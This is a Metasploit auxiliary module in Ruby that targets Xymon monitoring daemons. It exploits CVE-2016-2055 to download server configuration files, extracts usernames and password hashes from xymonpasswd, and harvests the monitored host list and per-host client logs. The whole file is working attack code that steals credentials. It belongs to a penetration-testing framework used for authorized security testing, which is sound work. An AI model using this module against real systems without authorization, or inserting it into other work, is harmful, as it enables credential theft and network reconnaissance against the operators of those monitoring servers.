##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Xymon Daemon Gather Information',
      'Description' => %q{
        This module retrieves information from a Xymon daemon service
        (formerly Hobbit, based on Big Brother), including server
        configuration information, a list of monitored hosts, and
        associated client log for each host.

        This module also retrieves usernames and password hashes from
        the `xymonpasswd` config file from Xymon servers before 4.3.25,
        which permit download arbitrary config files (CVE-2016-2055),
        and servers configured with `ALLOWALLCONFIGFILES` enabled.
      },
      'Author'      => [
        'Markus Krell', # CVE-2016-2055 discovery
        'bcoles'        # Metasploit
      ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2016-2055'],
          ['PACKETSTORM', '135758'],
          ['URL', 'https://lists.xymon.com/pipermail/xymon/2016-February/042986.html'],
          ['URL', 'https://xymon.sourceforge.net/'],
          ['URL', 'https://en.wikipedia.org/wiki/Xymon'],
          ['URL', 'https://en.wikipedia.org/wiki/Big_Brother_(software)']
        ]
    )
    register_options [Opt::RPORT(1984)]
  end

  def xymon_send(cmd)
    vprint_status "Sending: #{cmd}"
    connect
    sock.puts cmd
    sock.shutdown(:WR)
    return sock.get(5)
  ensure
    disconnect
  end

  def run
    res = xymon_send('ping').to_s

    unless res.starts_with? 'xymond'
      print_error 'Target is not a Xymon daemon'
      return
    end

    version = res.scan(/^xymond ([\d\.]+)/).flatten.first

    unless version
      print_error 'Could not retrieve Xymon version'
    end

    print_status "Xymon daemon version #{version}"

    service_data = {
      address: rhost,
      port: rport,
      service_name: 'xymond',
      protocol: 'tcp',
      info: version,
      workspace_id: myworkspace_id
    }

    xymond_service = report_service(service_data)

    print_status 'Retrieving configuration files ...'

    %w(xymonserver.cfg hosts.cfg xymonpasswd).each do |config|
      res = xymon_send("config #{config}").to_s

      if res.blank?
        print_error "Could not retrieve #{config}"
        next
      end

      path = store_loot(
        "xymon.config.#{config.sub(/\.cfg$/, '')}",
        'text/plain',
        target_host,
        res,
        nil,
        "config #{config}",
        xymond_service
      )

      print_good "#{config} (#{res.size} bytes) stored in #{path}"

      if config == 'xymonpasswd'
        res.each_line.map {|l| l.strip}.reject{|l| l.blank? || l.starts_with?('#')}.each do |c|
          user = c.split(':')[0].to_s.strip
          hash = c.split(':')[1].to_s.strip

          print_good("Credentials: #{user} : #{hash}")

          credential_data = {
            module_fullname: fullname,
            origin_type: :service,
            private_data: hash,
            private_type: :nonreplayable_hash,
            jtr_format: identify_hash(hash),
            username: user
          }.merge(service_data)

          login_data = {
            core: create_credential(credential_data),
            status: Metasploit::Model::Login::Status::UNTRIED
          }.merge(service_data)

          create_credential_login(login_data)
        end
      end
    end

    print_status 'Retrieving host list ...'

    res = xymon_send('hostinfo').to_s

    if res.blank?
      print_error 'Could not retrieve client host list'
      return
    end

    path = store_loot(
      'xymon.hostinfo',
      'text/plain',
      target_host,
      res,
      nil,
      'hostinfo',
      xymond_service
    )

    print_good "Host info (#{res.size} bytes) stored in #{path}"

    hosts = res.each_line.map {|line| line.split('|').first}.reject {|host| host.blank?}

    if hosts.empty?
      print_error 'Found no client hosts'
      return
    end

    print_good "Found #{hosts.size} hosts"

    print_status 'Retrieving client logs ...'

    hosts.each do |host|
      res = xymon_send("clientlog #{host}")

      unless res
        print_error "Could not retrieve client log for #{host}"
        next
      end

      if res.blank?
        print_status "#{host} client log is empty"
        next
      end

      path = store_loot(
        "xymon.hosts.#{host}",
        'text/plain',
        target_host,
        res,
        nil,
        "clientlog #{host}",
        xymond_service
      )

      print_good "#{host} client log (#{res.size} bytes) stored in #{path}"
    end
  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
  rescue Timeout::Error => e
    print_error(e.message)
  end
end
